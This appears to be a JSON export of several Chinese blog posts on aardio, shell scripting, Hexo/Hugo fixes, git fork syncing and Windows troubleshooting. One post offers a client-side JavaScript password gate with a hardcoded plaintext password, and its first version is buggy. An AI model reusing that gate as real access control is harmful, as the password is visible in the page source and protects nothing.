reduce 是一个经典的无循环函数，在js，python这些语言中都有相同的函数， aardio中 reduce 函数的设计，基本与js的用法规则一样，例如空数组不指定初始值报错，指定初始值不跳过第一个数组成员，不指定初始值跳过第一个数组成员（用第一个数组成员作为初始值），初始值可以是任意对象，这些规则全都一样，参数的位置用法都一样。 基本用法 Function 基本用法 Function ，结构： 1返回值 = reduce(数组，回调函数（结果，当前成员，当前索引），结果初始值) 用法： 123456返回值 = reduce(要操作的数组 ，function( 结果 /*初始值或上次结果*/ ,数组当前成员,数组当前索引)&#123; 处理函数语句; return 本次结果; // 回调函数的返回值，即为修改结果值：结果 = 本次结果 ，同时在下次回调时传入该值。 &#125;, 结果初始值 // 指定结果初始值：结果= 结果初始值 ) // 【结果】在reduce结束后，会当做 reduce 的【返回值】返回。 用法示例 用法1，数组值求和： 1234567import console;var arr = &#123;1;2;3;4;5&#125;var value = reduce(arr, lambda(a,b) a + b );console.dump(value);console.pause(true); 用法2，将数组中所有值转换为字符串 123456789101112import console;var arr = &#123;1;22;3;456&#125;//将数组中的所有值转换为字符串var value = reduce(arr,function(a,b,i)&#123; a[ i ] = tostring(b) return a;&#125;,&#123;&#125;);console.dump(value);console.pause(true); 用法3，筛选数组中的值 123456789101112import console;var arr = &#123;1;22;3;456&#125;//筛选出所有小于100的数var value = reduce(arr,function(a,b)&#123; if( b &lt;100) table.push(a,b); return a;&#125;,&#123;&#125;);console.dump(value);console.pause(true); 摘抄网友提炼的重点「待消化o(╯□╰)o」 reduce 是一个经典的无循环函数。 指定【结果初始值】时，回调函数 function 的【结果】=【结果初始值】，数组成员从头到尾逐个遍历，【数组当前成员值】从第1个开始，【数组当前索引】从1开始。 不指定【参考值的初始值】时，回调函数 function 的【结果】= 【数组的第1个成员值】。顺理成章的，数组成员就不能再从第个开始，而是跳过第1个，从第2个开始遍历。【数组当前成员值】从第2个开始，【数组当前索引】从2开始。所以，在此情况下，如果要操作的数组为空数组{}时，不指定初始值则会报错。因为空数组不存在“第1个成员值”，也就无法给“结果”赋值。 初始值可以是任意对象，如： 123，{} ，“abc” 等。 最后一次赋值的【结果】，将作为 reduce 的最终返回值。 数组 指定结果初始值 回调函数 function() 返回值（参考值） 空数组 必须指定 不执行 结果 = 结果初始值 1个成员的数组 如果指定初始值 执行1次 结果 = 本次结果 如果指定初始值 执行1次 结果 = 本次结果 2个以上成员的数组 皆可 至少执行1次 结果 = 最后一个本次结果 参考文档 网友的笔记 官网论坛：reduce 函数用法大全","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"从零开始学aardio笔记：模式匹配","slug":"aardio-notes-03","date":"2020-12-07T07:30:19.000Z","updated":"2020-12-07T07:30:19.000Z","comments":true,"path":"aardio-notes-03.html","permalink":"https://sobaigu.com/aardio-notes-03.html","excerpt":"","text":"前言 开始尝试着解决一些实际问题，在学的过程中，有些知识点和以前理解的不一样，或者以前理解的正则规则就错了。刚好要用到提取网页数据，把aardio的模式匹配入门过了一遍。 要在实践中去掌握知识。 知识是从来不能脱离实践的，例如贪婪匹配，逻辑匹配，你为什么不用学？你碰到了实际的需要，你会想：要是这里能……多好啊？ 你一查，还真有呢，你马上就懂了，几乎就是闪电的时间你就明白了，这就是实践中碰撞出来的知识火花。 – 《模式匹配快速入门》 修饰符 . ：任意字符/字节（ 与正则表达式相同 ） : ：任意双字节( 中文字符，正则表达式无此语法 ) *，+ ：星号表示出现0到任意次，加号则表示出现1次到任意次 ^，&amp; ：字符串开始和结束 [] ：匹配指定字符中的某个 () ：圆括号设定模式匹配返回的结果，每增加一对圆括号，匹配函数就多一个返回值 「新知识√」 &lt;&gt; ：字符串匹配，匹配尖括号中的整串字符 &#123;&#125; ：大括号指定模式重复匹配的次数 % ：对称匹配 其他预定义字符 \\n ：换行符 \\r 回车符 \\w 字母和数字 \\s 空白符 \\d 数字 \\f 换页符 \\x0c \\v 匹配一个垂直制表符。等价于 \\x0b \\t 制表符 以上部分与正则表达式兼容，以下是 aardio 模式匹配特有： \\a 字母 \\c 控制字符 \\i 是否ASCII字符( 字节码 &lt; 0x80 ) \\l 小写字母 \\p 标点字符 \\u 大写字母 \\x 十六进制数字（正则表达式里用于16进制字符前缀，即 \\xhh ） \\z 表示 \\0 大写表示反义( 与正则表达式相同 )，例如\\D表示不是数字的字符。 修饰符示例 指定一个模式应当怎样去匹配。修饰符有很多种，而最常用的就是用来指定匹配次数。 p&#123;2,3&#125; 表示 a 出现 2 到 3 次 123io.open()结果 = string.match(&quot;12345678&quot;,&quot;\\d&#123;2,5&#125;&quot;)io.print( 结果 ) //显示 12345 p+ 表示 a 出现 1 次到任意次数，等价于 p&#123;1,&#125; 123io.open()结果 = string.match(&quot;12345678&quot;,&quot;\\d+&quot;)io.print( 结果 ) //显示 12345678 p* 表示 a 出现 0 次到任意次数，等价于 p&#123;0,&#125; 123io.open()结果 = string.match(&quot;12345678&quot;,&quot;\\d+\\s*&quot;) //这里的&quot;\\s*&quot;匹配零个或多个空格io.print( 结果 ) //还是显示 12345678 匹配身份证的例子 匹配身份证示例及更完整的教程，请参考aardio官方教程： 模式匹配快速入门","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"判断文件/文件夹是否存在及外部参数的shell","slug":"shell-if-exist-param","date":"2020-11-03T07:15:18.000Z","updated":"2020-11-03T07:15:18.000Z","comments":true,"path":"shell-if-exist-param.html","permalink":"https://sobaigu.com/shell-if-exist-param.html","excerpt":"","text":"前言 自用的shell脚本，现学现用，也许不是那么规范，权当自己的学习笔记，老鸟莫笑。 基础语法 判断命令是否存在： 123if [ `command -v command` ]; then # bodyfi 判断文件夹是否存在： 123if [ ! -d &quot;$directory&quot; ]; then echo directory is not existsfi 判断路径是否存在： 123if [ -e &quot;$path&quot; ]; then echo existsfi 判断文件是否存在： 123if [ -f &quot;$file&quot; ]; then echo file existsfi 判断文件是否为空： 123if [ -s &quot;$file&quot; ]; then echo file not emptyfi 创建文件夹 文件和文件夹判断语法见上文，判断语句只是参数和创建命令不同，相应变更即可，此处只是示例。如果文件夹 testdir 不存在，则创建： 1234567!/bin/bashif [ ! -d testdir ];then mkdir testdirelse echo &quot;dir is exist&quot;fi 将shell改进一下，接收外部参数直接创建目录： 123456789101112131415#!/bin/bash# 判断传入的参数的个数是不是一个if [ ! $# -eq 1 ];then echo &quot;param error!&quot; exit 1fi# 判断目录是不是已经存在，如果不存在则创建，存在则输出“dir is exist” dirname=$1echo &quot;the dir name is $dirname&quot;if [ ! -d $dirname ];then mkdir $dirnameelse echo &quot;dir is exist&quot;fi 其他应用可以以基础语法举一反三即可。","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"HTML输入密码后才能访问","slug":"html-with-password","date":"2020-10-16T00:53:41.000Z","updated":"2020-10-16T00:53:41.000Z","comments":true,"path":"html-with-password.html","permalink":"https://sobaigu.com/html-with-password.html","excerpt":"","text":"前言 有小伙伴提了个需求：说网站放 Github Page 上，但不想人人都能访问，怎样用做一个密码加密，比如输入6位密码，密码输入正确自动跳转，错误给出提示？ 实现 这个可以用HTML加JS写一个密码输入框，在正确输入密码前阻断内容显示，糊弄下小白还是可以的，画面也比较简洁。 简单实用密码弹出框 在模板或者HTML页头位置加入如下代码，只要是内容显示前就行： 123456789101112131415161718&lt;script language = JavaScript&gt;function password() &#123; var testV = 1; var pass1 = prompt(&#x27;请输入密码:&#x27;, &#x27;&#x27;); while (testV &lt; 3) &#123; if (!pass1) history.go(-1); if (pass1 == &quot;123456&quot;) &#123; alert(&#x27;密码正确!&#x27;); break; &#125; testV += -1; var pass1 = prompt(&#x27;密码错误!请重新输入:&#x27;); &#125; if (pass1 != &quot;password&quot; &amp; testV == 3) history.go(-1); return &quot; &quot;;&#125;document.write(password());&lt;/script&gt; 逼格稍微高点的页面密码框 body里面的代码 123456789101112131415161718&lt;span style=&quot;font-family: 黑体;&quot;&gt;请输入密码:&lt;/span&gt;&lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;密码输入框&quot;/&gt;&lt;table width=&quot;300&quot; height=&quot;300&quot; style=&quot;text-align: center;&quot;&gt; &lt;tr&gt; &lt;td id=&quot;1&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;1&lt;/td&gt; &lt;td id=&quot;2&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;2&lt;/td&gt; &lt;td id=&quot;3&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td id=&quot;4&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;4&lt;/td&gt; &lt;td id=&quot;5&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;5&lt;/td&gt; &lt;td id=&quot;6&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;6&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td id=&quot;7&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;7&lt;/td&gt; &lt;td id=&quot;8&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;8&lt;/td&gt; &lt;td id=&quot;9&quot; onmouseenter=&quot;doenter(this)&quot; onmouseout=&quot;doout(this)&quot; onmousedown=&quot;dodown(this)&quot; onmouseup=&quot;doup(this)&quot;&gt;9&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; js代码 12345678910111213141516171819202122232425262728293031var password = 123456;var input = document.getElementById(&quot;password&quot;);var td = document.getElementsByTagName(&quot;td&quot;);for(var i = 0;i &lt; td.length;i++)&#123; td[i].style.color = &quot;white&quot; td[i].style.backgroundColor = &quot;#EAEAEA&quot;; td[i].style.borderRadius = &quot;50px&quot;;&#125;function dodown(obj)&#123; obj.style.backgroundColor = &quot;darkgray&quot;; input.value += obj.id; &#125;function doup(obj)&#123; obj.style.backgroundColor = &quot;#EAEAEA&quot;; if(input.value.length == 6)&#123; if(input.value == password)&#123; alert(&quot;登录成功&quot;); location.href=&quot;https://sobaigu.com&quot;; &#125;else&#123; alert(&quot;密码错误，登录失败&quot;) input.value = null; &#125; &#125;&#125;function doenter(obj)&#123; obj.style.backgroundColor = &quot;lightgray&quot;;&#125;function doout(obj)&#123; obj.style.backgroundColor = &quot;#EAEAEA&quot;;&#125;","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"从零开始学aardio笔记：基础规范","slug":"aardio-notes-02","date":"2020-10-12T04:54:04.000Z","updated":"2020-10-12T09:54:04.000Z","comments":true,"path":"aardio-notes-02.html","permalink":"https://sobaigu.com/aardio-notes-02.html","excerpt":"","text":"前言 这里的基础规范不包括所有的语法，只是作为一个初学者注意到的可能会混淆的概念，会有出错的细节做个记录，以及为今后养成一些固定格式习惯之用，各种语法规范请参见aardio帮助文档即可。 基本规范 变量命名规则 推荐用小驼峰命名法，即小写在前大写在后，如： 12var robotName = &quot;QQ机器人&quot;; 语句判别 每行一句，以 ; 结尾，不以换行为判断。实际上 ; 不写也没关系，aardio会检查语句的完整性。为代码统一规范美观，建议语句结尾带上 ; 结尾，如： 1234if(mainForm)&#123; mainForm.text = &quot;测试&quot;; mainForm.show();&#125; 空格/空行使用 相关代码放在一起，不相关代码用一个空行间隔 赋值，比较等表达式符号两边各添加一个空格 () 内相关参数，条件等前后不留空格 校长的教程里有些是有空格，有些是不留空格的，自己统一下吧，如上面的代码段所示。 语法注意事项 特殊符号 '' ：与 &quot;&quot; 不同的是单引号支持转义，如 str = 'abc\\r\\n' ，而双引号内转义符会处理成普通字符 _ ：下划线开头表示常量，值不可改变 :: ：声明一个全局常量，如 ::str = &quot;abc&quot; .. ：全局名字空间引用符，如 ..io.open(); # ：取长运算符(单目运算符)，如果对象是 null ，返回 0 ，如果对象是字符串返回字符串长度 ++ ：一个加是运算符，两个加则是字符串连接符，如 str = abc ++ 123 ，则 str = abc123 === 或 !== ：== 判断值相等时，0 和 false 是一样的， 而三个等号则是全等式运算符，表示强匹配，此时 null 和 0 false 是不一样的 其他事项 aardio 对大小写敏感，mainForm 和 mainform 是不同的两个对象，str = abc 和 stR = abc 是不一样的 除 aardio 核心库，外部库需要先 import 导入 定义一个库时，使用其他库名字空间时需全局引用：var out = ..fsys.createDir(outdir);","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"从零开始学aardio笔记：潜心，一步一脚印","slug":"aardio-notes-01","date":"2020-10-11T01:54:04.000Z","updated":"2020-10-11T01:54:04.000Z","comments":true,"path":"aardio-notes-01.html","permalink":"https://sobaigu.com/aardio-notes-01.html","excerpt":"","text":"前言 大概4年多前接触的aardio，那时候他还是叫做AAU、快手编程。当时就是觉着这个语言实用，易上手，实际上也是，翻了两天文档就给自己写了个测试用的工具及几个小玩具，这对于当时0基础的小白来说是很兴奋的一件事情。 可惜后来由于自己意志力不坚定，也没什么动力去研究。虽然前后报名了作者开的培训班两次，但都没认真对待，想想荒废了这么些时间，真的有点不应该。 时至今日，突然要自己面对技术问题，需要自己去实现些自己需要的功能，才终觉要是当年认真学学就好了。往事只能追忆，咱还是从头开始，一步一脚印吧，好在校长还没把咱踢出学习群，加油！ 学习计划 [x] 2020年10月内把校长之前发的视频教程学习完，并完成教学案例中相关程序 [ ] 2020年设计一个QQ机器人插件 [ ] 2021年中旬完成在线建站系统功能编写 关于笔记 学习过程中会记录一些自己认为要注意的点，或者自己的感想，学到哪记到哪吧，给自己看的，如果有志同道合的同志，欢迎一起交流。 博客关闭了评论功能，有心的欢迎到Github找我，相信你能找到的，O(∩_∩)O哈哈~","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"aardio","slug":"aardio","permalink":"https://sobaigu.com/tags/aardio/"}]},{"title":"转：php源码随机输出某个目录下的图片API","slug":"php-image-api","date":"2020-09-19T15:10:23.000Z","updated":"2020-09-19T15:10:23.000Z","comments":true,"path":"php-image-api.html","permalink":"https://sobaigu.com/php-image-api.html","excerpt":"","text":"前言 搞了一大批美女图，想给网友过过眼，写个php源码随机输出某一个目录下的图片，可用于随机图片API接口。 代码 把下面的代码保存为 imgapi.php ： 1234567&lt;?phpheader(&#x27;Content-type: image/jpg&#x27;);$img_array = glob(&quot;./*.&#123;gif,jpg,png&#125;&quot;,GLOB_BRACE);$img = array_rand($img_array);$image = file_get_contents($img_array[$img]);echo $image;?&gt; 保存就可以调用这个接口。 使用方法 调用方式为：域名/imgapi.php，图片目录为 imaapi.php 同级目录。 也可以自定义图片的目录，把下面代码： 1$img_array = glob(&quot;./*.&#123;gif,jpg,png&#125;&quot;,GLOB_BRACE); 改为以下代码，img 是图片目录名，可以随意更改： 1$img_array = glob(&quot;./img/*.&#123;gif,jpg,png&#125;&quot;,GLOB_BRACE); 这样就可以调用 img 目录下的图片了。 原文链接","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"转：解决微信0字节文件占用大量空间导致C盘空间不足","slug":"wechat-files-pchunter","date":"2020-09-19T03:06:59.000Z","updated":"2020-09-19T03:06:59.000Z","comments":true,"path":"wechat-files-pchunter.html","permalink":"https://sobaigu.com/wechat-files-pchunter.html","excerpt":"","text":"前言 突然发现系统有点卡，原来是C盘没空间了，隔一会儿微信PC客户端也提示系统盘没空间了，功能异常。 这空间消失得莫名其妙，也没干啥，就挂了个微信客户端而已。 解决 找了个bat清理了下，但空间几乎没释放，所以到 %temp% 目录下去看了下，有些文件没删除掉，而且占用空间极大，但文件本身极小，都是0字节文件： 用 proexp 看了下，这些文件都属于微信进程，而且都处于锁定状态，也不知道微信在干啥，或者有什么八阿哥。 退出微信客户端再次删除，提示无法删除，上 PC Hunter ：文件》本地磁盘C》用户》用户名》AppData》Temp 在需要删除的文件或文件夹上 右键》强制删除 ，立马多出来10个G！ 上文提及的 PC Hunter 请到此下载：PCHunter - 强大的系统信息查看与手工杀毒辅助软件 参考链接 解决微信0字节文件占用大量空间导致C盘空间不足 PC Hunter-系统信息分析查看及维护工具","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"解决NSIS程序安装报错问题","slug":"nsis-error-launching-installer","date":"2020-09-14T01:38:14.000Z","updated":"2020-09-14T01:38:14.000Z","comments":true,"path":"nsis-error-launching-installer.html","permalink":"https://sobaigu.com/nsis-error-launching-installer.html","excerpt":"","text":"前言 装了个VPS，用的供应商提供的Windows server 2012，英文版本懒得改，反正也看得懂。但有需要安装一个中文输入法，结果下了个搜狗却安装不上…… 现象 安装程序启动后，直接报：NSIS error launching installer 或者安装完了后软件中文标题显示乱码： 解决 这个问题是系统语言为英文，然后下载的这个安装包是搜狗去广告二次打包版，并未做多语言兼容，所以需要将系统语言设置为 中文： 打开 控制面板/Control Panel\\Clock, Language, and Region Region and Language 》弹除的窗口点击 Administrative 标签 Change system locale... 》 Current system locale: 下拉选择 Chinese(Simplified,PRC) 点击确定，按提示重启系统后即可运行NSIS安装包","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Git进行fork后与原仓库同步方法","slug":"git-sync-from-upstream-command","date":"2020-09-09T07:50:03.000Z","updated":"2020-09-09T07:50:03.000Z","comments":true,"path":"git-sync-from-upstream-command.html","permalink":"https://sobaigu.com/git-sync-from-upstream-command.html","excerpt":"","text":"前言 在你 fork 一个仓库之后， 往往上游的仓库又更新了。但 Git 不会自动帮你把上游的仓库同步给你 fork 后的仓库，有时候自己的一些更改也需要保留……此时，就需要学会与上游仓库合并更改及同步。 方法 最省事的办法可能是： 在你 fork 的仓库 setting 页翻到最下方，然后 delete 这个仓库 然后重新 fork 仓库，并 git clone 到你的本地 但在更多情况下，删掉自己fork的库，应该是你的最后选择，而不应该是首选。 可行的首选方法简单的说就是： fork 你要的仓库到自己账号下 git clone fork后的仓库到本地 打开 Git bash ，以下是需要输入的命令： git remote -v #查看远程状态 git remote add upstream https://github.com/OWNER/REPOSITORY.git #配置完建议再次查看状态确认是否配置成功 git fetch upstream #从上游仓库 fetch 分支和提交点，提交给本地 master，并会被存储在一个本地分支 upstream/master git checkout master #切换到本地主分支(如果不在的话) git merge upstream/master #把 upstream/master 分支合并到本地 master 上，这样就完成了同步，并且不会丢掉本地修改的内容。 git push origin master #这一步就把合并后的内容推送到fork后的仓库里了","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"Hexo子文件夹页面样式错乱问题排查","slug":"hexo-style-error-by-upcase-in-url","date":"2020-09-03T04:30:44.000Z","updated":"2020-09-03T04:30:44.000Z","comments":true,"path":"hexo-style-error-by-upcase-in-url.html","permalink":"https://sobaigu.com/hexo-style-error-by-upcase-in-url.html","excerpt":"","text":"前言 玩Hexo不短了，突然在某个新网站部署时，发现首页一切正常，但点开子页面，如标签、分类等页面时，页面样式却是错乱的。 以为是文件没有上传完整，结果发现本地预览情况是一样的，且样式错乱时Hexo控制台并没有抛出任何错误提示，此类情况第一次关注到。 现象 首页打开正常，文章也能正常打开 标签、分类、存档等目录页时样式错乱 排错 排除主题导致 将主题配置为默认主题，然后再预览，发现问题同样的，说明跟主题无关，换什么主题都是这个现象。 添加 --debug 查看详细日志 只用 hexo s 启动时，控制台并没有触发任何异常，但前台页面却是错乱的，浏览器开发者工具打开，可见错误日志为： Refused to apply style from ‘http://localhost/archives/css/style.css’ because its MIME type (‘text/html’) is not a supported stylesheet MIME type, and strict MIME checking is enabled. 错误日志可见样式未加载，但这个拒绝理由让人看得云里雾里的，通过 hexo s --debug 启动后，可查看控制台日志输出： 1234567891011121305:41:09.217 DEBUG Rendering HTML index: index.htmlGET / 200 66.447 ms - -GET /css/style.css 200 3152.749 ms - -GET /img/avatar.png 200 27.883 ms - -GET /img/scrollbar_arrow.png 200 1.847 ms - -GET /background/bg-4.jpg 200 8.649 ms - -GET /js/main.js 200 6.026 ms - -GET /js/pc.js 200 10.412 ms - -05:41:16.058 DEBUG Rendering HTML archive: archives/index.htmlGET /archives/ 200 29.652 ms - -GET /archives/css/style.css 404 5.746 ms - 161GET /archives/css/style.css 404 1.261 ms - 161GET /img/avatar.png 200 1.023 ms - - 这里错误显示 /archives/css/style.css 这个文件 404 了，执行 hexo g 生成完，确实不会有这个文件存在，所以应该是程序解析资源路径识别上出了问题，打开 /archives/ 目录下的 index.html ，可见资源引用路径为： 1&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt; 这个路径表示当前路径下的 css 文件夹，该样式应该是全局的才正确。 修正解决 我们知道一个完整的资源路径应该是这样的： 1https://sobaigu.com/css/style.css 上面的路径解释为：协议+域名+文件夹路径+文件名 ，在Hexo中就有一段是关于域名和路径配置的： 123## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;url: http://yoursite.com #域名地址root: / #文件夹路径 自己的网站配置这个地方检察了下，发现是省略了协议同时出现了大写字母，大写字母浏览器可以自动修正，但Hexo程序解析的时候却出了错，所以解决方法变是将大写字母改成小写，或者将协议添加完整： 12url: sobaigu.com #是否带协议各有利弊root: / 如果添加协议的话就可以兼容大小写： 12url: http://SoBaigu.com #配置带协议在个别主题使用百度搜索时会出现问题root: /","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"解决Hexo主题Yelee首页文章不显示","slug":"hexo-theme-yelee-index-blank","date":"2020-08-28T02:56:41.000Z","updated":"2020-08-28T02:56:41.000Z","comments":true,"path":"hexo-theme-yelee-index-blank.html","permalink":"https://sobaigu.com/hexo-theme-yelee-index-blank.html","excerpt":"","text":"前言 看到一个源码下载站推荐了一个Hexo主题：Yelee ，皮肤挺讨人喜欢，功能也满足个人需求，就自作聪明进了官网从github仓库下载，结果运行起来首页空白，不显示任何文章。 再回头看下载站推荐的，他们的标题写着完美修复版，原来是站长早知道有坑，看github记录也有好几年没人维护了，╮(╯▽╰)╭ 现象 不想截图，就是 post 目录下有文章，但在网站首页不显示出来，直接访问文章链接也能访问，浏览器 F12 可见错误： 12345Uncaught SyntaxError: Unexpected token &#x27;&#125;&#x27;(index):87 Uncaught ReferenceError: yiliaConfig is not defined at (index):87(index):91 Uncaught ReferenceError: yiliaConfig is not defined at (index):91 已经提示是配置错误了：yiliaConfig is not defined 解决修复 根据错误提示，定位到： 1234567891011121314151617&lt;script&gt; var yiliaConfig = &#123; fancybox: true, animate: true, isHome: true, isPost: false, isArchive: false, isTag: false, isCategory: false, fancybox_js: &quot;//cdn.bootcdn.net/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js&quot;, scrollreveal: &quot;//cdn.bootcdn.net/ajax/libs/scrollReveal.js/3.1.4/scrollreveal.min.js&quot;, search: &#125;&lt;/script&gt; &lt;script&gt; yiliaConfig.jquery_ui = [false]; &lt;/script&gt; //这里报错了 从错误往上翻，可见上面的 yiliaConfig 数组中，search: 未赋值，找到对应的模板按代码搜索，可见其使用的代码为： 1234567891011121314&lt;script&gt; var yiliaConfig = &#123; fancybox: &lt;%=theme.fancybox%&gt;, animate: &lt;%=theme.animate%&gt;, isHome: &lt;%=is_home()%&gt;, isPost: &lt;%=is_post()%&gt;, isArchive: &lt;%=is_archive()%&gt;, isTag: &lt;%=is_tag()%&gt;, isCategory: &lt;%=is_category()%&gt;, fancybox_js: &quot;&lt;%- theme.CDN.fancybox_js %&gt;&quot;, scrollreveal: &quot;&lt;%- theme.CDN.scrollreveal %&gt;&quot;, search: &lt;%= theme.search.on %&gt; //这个和配置对不上 &#125;&lt;/script&gt; 对应的代码还有另外两处，都是用的 &lt;%= theme.search.on %&gt; 方法获取配置，而主题配置 themes/yelee/_config.yml 中写的却是： 12search: onload: false 官方源码中提供的这个地方有小bug，简单点直接将该配置改成 on 即可： 12search: on: false","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"给hugo添加搜索功能","slug":"hugo-set-featuer-search","date":"2020-08-27T06:43:23.000Z","updated":"2020-08-27T06:43:23.000Z","comments":true,"path":"hugo-set-featuer-search.html","permalink":"https://sobaigu.com/hugo-set-featuer-search.html","excerpt":"","text":"前言 Hugo 这种静态站点默认没有搜索功能，大概因为没了数据库实现反而不方便。Search for your Hugo Website 列出了一些可选项，要么自己生成索引用开源的工具搜索，要么用第三方搜索服务如 algolia。 其实 algolia 也是运营几年的熟脸，提供的免费方案小网站也够用，但是还是第三方依赖，配置的动作同样还是要做的，不如自己来。 自己来的方案里我选择 Github Gist for Fuse.js integration ，因为它不需要另外引入 Node.js、 Grunt 或 Gulp，而是利用 Hugo 内置的功能在 build 的时候生成索引输出到 JSON，看起来更简单的样子。 输出索引文件 第一步：修改配置文件 Config.toml 添加以下内容： 12[outputs] home = [&quot;HTML&quot;, &quot;RSS&quot;, &quot;JSON&quot;] 第二步：创建 layouts/_default/index.json 12345&#123;&#123;- $.Scratch.Add &quot;index&quot; slice -&#125;&#125;&#123;&#123;- range .Site.RegularPages -&#125;&#125; &#123;&#123;- $.Scratch.Add &quot;index&quot; (dict &quot;title&quot; .Title &quot;tags&quot; .Params.tags &quot;categories&quot; .Params.categories &quot;contents&quot; .Plain &quot;permalink&quot; .Permalink) -&#125;&#125;&#123;&#123;- end -&#125;&#125;&#123;&#123;- $.Scratch.Get &quot;index&quot; | jsonify -&#125;&#125; 完成后可以从 /index.json 打开索引文件。 注：layouts/ 目录里保存的是 Hugo 的模板文件。layouts/ 是站点级别的模板， themes/&lt;theme name&gt;/layouts/ 是主题级别的模板，站点级别模板的设置优先于主题级别的模板。 创建搜索页面 第一步：创建 content/search.md 123456---title: &quot;Search Results&quot;sitemap: priority : 0.1layout: &quot;search&quot;--- 根据 URL 规则，Hugo 会生成 /search/index.html 或 /search.html 。但是因为 content/ 里的内容不支持插入 JS ，所以此处的关键是 layout: &quot;search&quot; 指定模板文件，之后在模板文件中实现搜索功能。 第二步：创建 layouts/_default/search.html 12345678910111213141516171819202122&lt;section&gt; &lt;div&gt; &lt;form action=&quot;&#123;&#123; &quot;search&quot; | absURL &#125;&#125;&quot;&gt; &lt;input id=&quot;search-query&quot; name=&quot;s&quot;/&gt; &lt;/form&gt; &lt;div id=&quot;search-results&quot;&gt; &lt;h3&gt;Matching pages&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt;&lt;/section&gt;&lt;script id=&quot;search-result-template&quot; type=&quot;text/x-js-template&quot;&gt; &lt;div id=&quot;summary-$&#123;key&#125;&quot;&gt; &lt;h4&gt;&lt;a href=&quot;$&#123;link&#125;&quot;&gt;$&#123;title&#125;&lt;/a&gt;&lt;/h4&gt; &lt;p&gt;$&#123;snippet&#125;&lt;/p&gt; $&#123; isset tags &#125;&lt;p&gt;Tags: $&#123;tags&#125;&lt;/p&gt;$&#123; end &#125; $&#123; isset categories &#125;&lt;p&gt;Categories: $&#123;categories&#125;&lt;/p&gt;$&#123; end &#125; 